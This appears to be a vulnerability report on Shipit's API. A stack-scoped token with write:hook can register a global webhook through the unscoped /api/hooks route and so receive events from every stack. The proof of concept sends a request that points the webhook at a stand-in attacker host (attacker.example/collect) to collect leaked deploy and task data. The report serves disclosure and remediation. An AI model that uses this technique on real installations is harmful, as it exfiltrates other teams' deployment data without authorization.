### Title
Stack-scoped API token can create a global webhook that leaks state of every stack in the installation - (File: app/controllers/shipit/api/hooks_controller.rb)

### Summary
An `ApiClient` that is restricted to a single stack (`ApiClient#stack_id`) can, if granted the `write:hook` permission, register a webhook with no `stack_id` via the top-level `resources :hooks` route. Because `Hook.for_stack` treats hooks with `stack_id: nil` as "global" and delivers every event for every stack to them, this lets a token whose authorization is scoped to stack A receive deploy/task/commit/merge events and payloads for all other stacks in the Shipit instance.

### Finding Description
The API exposes two routes for hooks: a stack-scoped one (`/api/stacks/*stack_id/hooks`) and an unscoped, top-level one (`resources :hooks`) both handled by [1](#0-0) .

`HooksController#create` computes the target stack purely from parameter presence:
```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
``` [2](#0-1) 

When `params[:stack_id]` is present, `stack` is invoked, which correctly restricts the accessible stacks to the API client's own scope:
```ruby
def stacks
  @stacks ||= current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
end

def stack
  @stack ||= stacks.from_param!(params[:stack_id])
end
``` [3](#0-2) 

However, when the request hits the top-level `resources :hooks` route (no `stack_id` param), `stack` is never called, so `current_api_client.stack_id` is never consulted — `stack_id` simply resolves to `nil`, and the created `Hook` has `stack_id: nil`, i.e. it is a **global** hook:
```ruby
scope :global, -> { where(stack_id: nil) }
scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }
``` [4](#0-3) 

Delivery is driven by `for_stack`, which always includes global hooks regardless of which stack emitted the event:
```ruby
def deliver(event, stack_id, payload)
  for_stack(stack_id).listening_event(event).each do |hook|
    hook.deliver!(event, payload)
  end
end
``` [5](#0-4) 

The only gate on hook creation is a scope-independent permission string, `write:hook`, checked via `ApiClient#check_permissions!`, which has no notion of the client's own `stack_id` restriction: [6](#0-5) . `PERMISSIONS` lists `write:hook`/`read:hook` as global, stack-independent grants: [7](#0-6) .

This breaks the equality that should hold: **the stack a token is authorized for (`ApiClient#stack_id`) must equal the stack whose events a hook created by that token can touch (`Hook#stack_id` used in `for_stack`)**. Before the attacker's request, a stack-scoped client can only read/write within its own stack's resources through routes that call `stack`/`stacks`. After creating a hook through the unscoped route, that binding is broken: the resulting hook receives `stack`, `task`, `deploy`, `rollback`, `commit_status`, `merge`, `merge_status`, `pull_request`, `deployable_status`, and `review_stack` events — [8](#0-7)  — for every stack in the installation, not just the one the token is scoped to.

### Impact Explanation
This is a High-severity finding under the "unauthenticated/unauthorized read of stack state, task streams, or deploy output" bucket: a low-privilege, stack-scoped API credential (one that was only ever meant to read/write hooks for a single application/stack) can be turned into a mechanism that exfiltrates event payloads (deploy status, task/commit metadata, merge/PR activity) for every other stack managed by the same Shipit instance, to a URL the attacker controls. It does not require guessing any secret — only having a legitimate but narrowly-scoped `write:hook` token.

### Likelihood Explanation
Exploitation requires possession of a valid `ApiClient` token that has been granted `write:hook` while also being scoped to a single stack (`stack_id` set) — a plausible, supported combination since `write:hook` is listed as an ordinary, independently assignable permission in `ApiClient::PERMISSIONS`, and nothing in the UI/model prevents assigning it to a stack-scoped client. Once such a token exists, exploitation is a single unauthenticated-by-stack POST to `/api/hooks` (the unscoped route) with no `stack_id` param — no race condition or front-running needed, unlike the referenced report.

### Recommendation
In `Shipit::Api::HooksController`, when the requesting `current_api_client` is stack-scoped (`current_api_client.stack_id?`), reject or force-scope hook creation/listing to that stack — i.e., always route stack-scoped clients through `stacks`/`stack` (or explicitly deny access to the unscoped `resources :hooks` actions) rather than deriving `stack_id` solely from `params[:stack_id].present?`.

### Proof of Concept
1. As an administrator, create an `ApiClient` scoped to `stack: shipit-repo/some-stack` with permission `write:hook` (a legitimate-looking, narrowly scoped automation token).
2. Using that token's Basic-Auth credentials, `POST /api/hooks` (note: no `stack_id` in the path) with:
   ```
   { "delivery_url": "https://attacker.example/collect", "events": ["deploy", "task", "commit_status", "merge"] }
   ```
   This succeeds because `HooksController#create` only checks `write:hook` permission and does not verify `current_api_client.stack_id` when the unscoped route is used [9](#0-8) .
3. The resulting `Hook` record has `stack_id: nil`.
4. Any deploy/task/commit/merge event on *any* stack in the installation is now delivered to `https://attacker.example/collect`, because `Hook.deliver` uses `for_stack(stack_id)` which matches both `stack_id == the_event's_stack` and `stack_id == nil` [5](#0-4) , even though the originating `ApiClient` token was only authorized for one specific stack.
